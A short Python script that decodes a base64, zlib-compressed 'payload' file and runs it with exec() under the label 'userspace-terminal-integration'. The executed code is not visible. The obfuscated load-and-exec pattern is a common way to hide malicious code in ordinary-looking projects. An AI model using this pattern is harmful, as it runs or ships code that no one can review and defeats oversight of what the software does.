from pathlib import Path
import base64
import zlib

payload = Path("tools/userspace_terminal_payload.txt").read_text()
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, "userspace-terminal-integration", "exec"))
